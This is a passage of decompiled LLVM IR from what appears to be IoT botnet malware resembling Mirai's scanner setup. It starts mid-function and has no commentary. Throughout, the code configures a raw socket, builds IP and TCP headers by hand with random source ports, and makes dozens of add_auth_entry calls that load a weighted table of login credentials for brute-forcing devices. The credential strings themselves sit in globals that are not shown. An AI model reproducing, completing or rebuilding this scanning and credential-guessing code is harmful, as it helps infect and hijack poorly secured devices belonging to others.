  store i32 3, i32* %r1.global-to-local, align 4
  %v0_f968 = load i32, i32* @r5, align 4
  store i32 %v0_f968, i32* @r2, align 4
  %v2_f96c = call i32 @__libc_fcntl(i32 %v3_f94c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f974 = or i32 %v2_f96c, 2048
  store i32 %v1_f974, i32* @r2, align 4
  %v0_f978 = load i32, i32* @r4, align 4
  store i32 %v0_f978, i32* %r0.global-to-local, align 4
  %v2_f97c = call i32 @__libc_fcntl(i32 %v0_f978, i32 4)
  %v2_f984 = load i32, i32* @global_var_271d4.176, align 4
  store i32 %v2_f984, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_f990 = load i32, i32* @r5, align 4
  store i32 %v0_f990, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_f998 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_f998, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_f9a8 = call i32 @__GI_setsockopt(i32 %v2_f984, i32 %v0_f990, i32 3, i32 %v2_f998, i32 4)
  store i32 %v5_f9a8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9ac = icmp eq i32 %v5_f9a8, 0
  store i1 %v2_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9ac, label %dec_label_pc_f9b4, label %dec_label_pc_10ab4

dec_label_pc_f9b4:                                ; preds = %dec_label_pc_f964, %dec_label_pc_f9b4
  %v0_f9b4 = call i32 @rand_next()
  %v3_f9b8 = mul i32 %v0_f9b4, 65536
  store i32 %v3_f9b8, i32* %r0.global-to-local, align 4
  %v1_f9c0 = mul i32 %v0_f9b4, 256
  %v3_f9c4 = and i32 %v1_f9c0, 65280
  %tmp348 = udiv i32 %v0_f9b4, 256
  %v4_f9c8 = urem i32 %tmp348, 256
  %v5_f9c8 = or i32 %v4_f9c8, %v3_f9c4
  store i32 %v5_f9c8, i32* %r3.global-to-local, align 4
  %v2_f9cc = icmp ugt i32 %v5_f9c8, 1023
  store i1 %v2_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9cc = icmp eq i32 %v5_f9c8, 1024
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  %v3_f9d4 = icmp ult i32 %v5_f9c8, 1022
  br i1 %v3_f9d4, label %dec_label_pc_f9b4, label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f9b4
  %v5_f9d0.le = trunc i32 %v0_f9b4 to i16
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %r0.global-to-local, align 4
  %v2_f9dc = load i8, i8* bitcast (i8** @global_var_246c0.178 to i8*), align 4
  %v3_f9dc = zext i8 %v2_f9dc to i32
  %v1_f9e0 = and i32 %v3_f9dc, 240
  %v1_f9e4 = or i32 %v1_f9e0, 5
  store i32 %v1_f9e4, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_246c0.178 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_246c2.179 to i16*), align 4
  %v0_fa04 = call i32 @rand_next()
  %v1_fa04 = trunc i32 %v0_fa04 to i16
  %v3_fa0c = load i8, i8* @global_var_246e0.182, align 1
  store i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_fa0c, 16
  %v1_fa18 = zext i8 %tmp to i32
  store i32 6, i32* @r4, align 4
  %v1_fa20 = or i32 %v1_fa18, 80
  store i32 %v1_fa20, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_246c8.183 to i8*), align 4
  store i16 %v1_fa04, i16* bitcast (i32* @global_var_246c4.184 to i16*), align 4
  %v1_fa30 = trunc i32 %v1_fa20 to i8
  store i8 %v1_fa30, i8* @global_var_246e0.182, align 1
  store i8 6, i8* bitcast (i32* @global_var_246c9.185 to i8*), align 4
  %v4_fa38 = sext i16 %v5_f9d0.le to i32
  store i32 %v4_fa38, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_246d6.186, align 2
  store i16 %v5_f9d0.le, i16* bitcast (i32* @global_var_246d4.181 to i16*), align 4
  %v0_fa48 = call i32 @rand_next()
  %v1_fa48 = trunc i32 %v0_fa48 to i16
  %v3_fa50 = load i8, i8* @global_var_246e1.187, align 1
  %v4_fa50 = zext i8 %v3_fa50 to i32
  store i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32* %ip.global-to-local, align 4
  %v1_fa58 = or i32 %v4_fa50, 2
  store i32 %v1_fa58, i32* %r3.global-to-local, align 4
  store i16 %v1_fa48, i16* bitcast (i32* @global_var_246e2.188 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  %v1_fa64 = trunc i32 %v1_fa58 to i8
  store i8 %v1_fa64, i8* @global_var_246e1.187, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fa70 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fa80 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.196 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fa90 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b404.196 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b40c.198 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_faa0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b40c.198 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fab0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  %v5_fac0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32* %r1.global-to-local, align 4
  %v0_facc = load i32, i32* @r4, align 4
  store i32 %v0_facc, i32* %r2.global-to-local, align 4
  %v4_fad0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32 %v0_facc)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b41c.202 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_fae0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b41c.202 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_faf0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b42c.206 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_fb00 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b42c.206 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fb10 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b440.210 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fb20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b440.210 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32* %r1.global-to-local, align 4
  %v5_fb30 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb40 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r1.global-to-local, align 4
  %v5_fb50 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fb60 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb70 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb80 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fb90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_fba0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r1.global-to-local, align 4
  %v5_fbb0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fbc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fbd0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r1.global-to-local, align 4
  %v5_fbe0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  %v0_fbec = load i32, i32* @r4, align 4
  store i32 %v0_fbec, i32* %r2.global-to-local, align 4
  %v4_fbf0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 %v0_fbec)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_fc00 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b474.224 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_fc10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b474.224 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fc20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b480.228 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fc30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b480.228 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fc40 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fc50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fc60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fc70 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b494.232 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fc80 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b494.232 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_fc90 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4ac.236 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fca0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4ac.236 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b4b4.238 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fcb0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b4b4.238 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fcc0 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32* %r1.global-to-local, align 4
  %v5_fcd0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fce0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), i32 7)
  store i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32* %r1.global-to-local, align 4
  %v5_fcf0 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fd00 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32* %r1.global-to-local, align 4
  %v5_fd10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fd20 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  %v0_fd2c = load i32, i32* @r4, align 4
  store i32 %v0_fd2c, i32* %r2.global-to-local, align 4
  %v4_fd30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 %v0_fd2c)
  store i32 ptrtoint (i32* @global_var_1b4dc.248 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fd40 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b4dc.248 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1b4e4.250 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_fd50 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b4e4.250 to i32), i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32 13)
  store i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32* %r0.global-to-local, align 4
  %v0_fd58 = load i32, i32* @r4, align 4
  store i32 %v0_fd58, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32* %r1.global-to-local, align 4
  %v3_fd60 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32 ptrtoint (i32* @global_var_1b48c.230 to i32), i32 %v0_fd58)
  store i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32* %r0.global-to-local, align 4
  %v0_fd68 = load i32, i32* @r4, align 4
  store i32 %v0_fd68, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32* %r1.global-to-local, align 4
  %v3_fd70 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32 ptrtoint (i32* @global_var_1b414.200 to i32), i32 %v0_fd68)
  store i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32* %r1.global-to-local, align 4
  %v5_fd80 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_fd90 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4fc.254 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_fda0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b4fc.254 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b504.256 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fdb0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b504.256 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b50c.258 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fdc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b50c.258 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b514.260 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fdd0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b514.260 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
